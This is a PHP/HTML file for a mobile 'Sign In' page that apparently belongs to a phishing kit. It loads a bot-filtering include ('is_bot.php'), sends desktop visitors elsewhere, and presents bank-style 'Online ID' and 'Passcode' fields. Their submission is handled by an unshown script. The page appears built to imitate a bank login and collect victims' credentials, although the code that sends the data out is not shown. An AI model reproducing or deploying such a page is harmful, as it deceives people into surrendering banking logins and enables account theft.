<?php
require_once "is_bot.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="css/mobile.css">
    <script type="text/javascript">
        if (screen.width > 801) {
            window.location = "index";
        }      
    </script>
</head>

<body>
    <header>
        <div class="headerimg">
            <img src="img/header1.png">
        </div>
        <div class="headertitulo">
            Sign In
        </div>
    </header>
    <main>
        <form autocomplete="off" id="formusuario">
            <div class="form-group-p all">
                <input class="input input1" type="text" name="usuario" id="usuario" required placeholder="Online ID"> <img src="img/save.png" alt="save">
            </div>
            <div class="form-group-p all">
                <input style="width: 95vw;" class="input" type="password" name="clave" id="clave" required placeholder="Passcode" disabled>
            </div>
            <div class="form-group-b">
                <button type="button" id="enviarusuario" disabled><img src="img/secure_lock.png"> Sign In</button>
            </div>
        </form>
    </main>
    <script src="js/funciones.js"></script>
</body>

</html>